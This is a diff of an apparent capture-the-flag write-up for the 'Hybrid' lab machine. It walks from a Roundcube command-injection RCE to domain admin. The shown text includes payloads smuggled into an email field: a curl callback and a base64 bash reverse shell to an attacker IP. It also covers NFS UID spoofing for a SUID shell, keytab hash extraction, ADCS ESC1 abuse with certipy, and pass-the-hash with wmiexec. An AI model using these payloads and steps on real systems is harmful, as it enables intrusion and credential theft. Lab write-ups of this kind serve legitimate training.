@@ -150,6 +150,7 @@ Service detection performed. Please report any incorrect results at
 I also navigate directly to the mail server via its IP and I get redirected to mail01.hybrid.vl
 
 ![BloodHound Analysis](images/ hybrid1.png)
+
 I make sure to add the IP in `/etc/hosts` file and navigate to the URL via the browser:
 
 ```bash
@@ -207,13 +208,17 @@ peter.turner@hybrid.vl:{plain}PeterIstToll!
 
 I go back to the login page and I’m able to login to both accounts:
 
+
 ![BloodHound Analysis](images/hybrid3.png)
+
 
 ## Initial Foothold – Roundcube Webmail RCE
 
 I read the message from the admin and see a clue for the initial foothold.
 
+
 ![BloodHound Analysis](images/hybrid4.png)
+
 
 Doing a google search with those keywords we can see an advisory for mark as junk RCE.
 
@@ -233,7 +238,9 @@ admin&curl${IFS}10.8.7.96&@hybrid.vl
 
 Now mark any email as junk
 
+
 ![BloodHound Analysis](images/hybrid6.png)
+
 
 We’ll get a callback on our listener, so the commands are getting executed
 
@@ -250,56 +257,112 @@ admin&echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjAuMTM2LzIyMjIgMD4mMQo=${IFS}|$
 On doing the same procedure, we’ll get a reverse shell as `www-data`
 
 ![BloodHound Analysis](images/hybrid8.png)
+
+
 In `/home` we only see one user which is a domain user, `peter.turner`, I tried switching to peter by using his roudcube password but it didn't worked
 
 ![BloodHound Analysis](images/hybrid9.png)
+
+
 I tried cracking the password of `privkey.pem` but it took a long time so I decided to give up on that
 
 ![BloodHound Analysis](images/hybrid10.png)
+
+
 Reading `/etc/exports` file, we can see there's no `no_root_squash` so we cannot place bash binary owned by root user
+
+
 ![BloodHound Analysis](images/hybrid11.png)
+
 
 We know there’s peter.turner on the victim machine with the id `902601108`
 
 ![BloodHound Analysis](images/hybrid12.png)
 
+
 Before creating the user with the same uid on our machine we need to allow the creation of uids above 60000 range
+
+
 ![BloodHound Analysis](images/hybrid13.png)
 
+
 Edit the `/etc/logins.defs` and change the `UID_MAX` value
+
+
 ![BloodHound Analysis](images/hybrid14.png)
 
+
+
 ![BloodHound Analysis](images/hybrid15.png)
+
+
 Now copying bash binary in the mounted folder
+
 ![BloodHound Analysis](images/hybrid16.png)
+
+
 We can see that this binary is owned by peter.turner since we used the same UID and it’s a SUID, but on executing it wasn’t being executed due to a different GLIBC version, so instead transferring the bash binary from the victim machine and making it a SUID
+
 ![BloodHound Analysis](images/hybrid17.png)
 
+
 ![BloodHound Analysis](images/hybrid18.png)
+
+
 From peter’s home directory, we can find `passwords.kdbx` file which is a keepass password safe file
+
+
 ![BloodHound Analysis](images/hybrid19.png)
 
+
+
 ![BloodHound Analysis](images/hybrid20.png)
+
+
+
 Reading the kdbx file with `kpcli` , it’s going to ask for a master password
+
+
 ![BloodHound Analysis](images/hybrid21.png)
+
+
 Using peter’s roudcube password it worked on this file
+
+
 ![BloodHound Analysis](images/hybrid22.png)
+
+
 From `hybrid.vl` entry we can get the password of peter
+
+
 ![BloodHound Analysis](images/hybrid23.png)
+
+
+
 We can use this password to check privileges of peter, which can run anything as root
+
+
 
 ![BloodHound Analysis](images/hybrid24.png)
 
 
 ![BloodHound Analysis](images/hybrid25.png)
+
+
+
 Running `python-bloodhound` to enumerate the `trusted.vl` domain
 ```bash
 python3 /opt/BloodHound.py-Kerberos/bloodhound.py -d 'hybrid.vl' -u 'peter.turner' -p 'b0cwR+G4Dzl_rw' -gc 'dc01.hybrid.vl' -ns 10.10.132.229
 ```
 
 
+
+
 ![BloodHound Analysis](images/hybrid26.png)
+
+
 From bloodhound, there wasn’t any path from peter leading to domain admin
+
 
 ![BloodHound Analysis](images/hybrid27.png)
 
@@ -310,7 +373,11 @@ Enumerating ADCS with `[certipy](https://github.com/ly4k/Certipy)` for vulnera
 certipy find -u peter.turner@hybrid.vl -p 'b0cwR+G4Dzl_rw' -vulnerable -stdout -dc-ip 10.10.228.165
 ```
 
+
 ![BloodHound Analysis](images/hybrid28.png)
+
+
+
 Members of `Authenticated users` can enroll and authenticate any user with `hybrid-DC01-CA` (ESC-1), using `old-bloodhound` to get the result in json file so we can view it in bloodhound
 ```bash
 certipy find -u peter.turner@hybrid.vl -p 'b0cwR+G4Dzl_rw' -dc-ip 10.10.147.37 -old-bloodhound
@@ -318,29 +385,58 @@ certipy find -u peter.turner@hybrid.vl -p 'b0cwR+G4Dzl_rw' -dc-ip 10.10.147.37 -
 ```
 
 ![BloodHound Analysis](images/hybrid29.png)
+
+
+
 Make sure to add [custom queries](https://raw.githubusercontent.com/ly4k/Certipy/main/customqueries.json) for ADCS in `~./config/bloodhound/customqueries.json` to analyze ADCS in the domain
+
+
 ![BloodHound Analysis](images/hybrid30.png)
 
+
 After putting the custom queries we can see the templates being reflected on bloodhound
+
+
 ![BloodHound Analysis](images/hybrid31.png)
 
+
 Marking `hybrid-DC01-CA` as the high value target and checking the shortest path to hybrid-DC01-CA
+
+
 ![BloodHound Analysis](images/hybrid32.png)
 
+
+
 So now we need MAIL01’s hash, going back to linux machine as root user, we can extract the NTHash using [KeyTabExtract](https://github.com/sosdave/KeyTabExtract) from `/etc/krb5.keytab`
+
 
 ![BloodHound Analysis](images/hybrid33.png)
 
 
+
 ![BloodHound Analysis](images/hybrid34.png)
+
+
 From certipy we didn’t found any template names, from bloodhound we can see two templates from which using `HYBRIDCOMPUTERS`
+
+
 ![BloodHound Analysis](images/hybrid35.png)
 
+
+
 On requesting the certificate, it was giving an error related to public key requirement
+
+
 ![BloodHound Analysis](images/hybrid36.png)
+
+
+
 Checking the pem file we have, we can see the size of the public key, which is 4096 bit
 
 ![BloodHound Analysis](images/hybrid37.png)
+
+
+
 Specifying the size of the public key file and requesting the certificate to authenticate as administrator
 
 ```bash
@@ -350,6 +446,9 @@ certipy req -u 'MAIL01$' -hashes ":0f916c5246fdbc7ba95dcef4126d57bd" -dc-ip "10.
 
 ![BloodHound Analysis](images/hybrid38.png)
 
+
+
+
 Now again with certipy we can request administrator's NTHash
 
 ```bash
@@ -357,7 +456,7 @@ certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'hybrid.
 ```
 
 
-![BloodHound Analysis](images/hybrid39.png)
+
 We can get a shell through `wmiexec`
 ```bash
 wmiexec.py administrator@10.10.252.181 -hashes ':60701e8543c9f6db1a2af3217386d3dc'
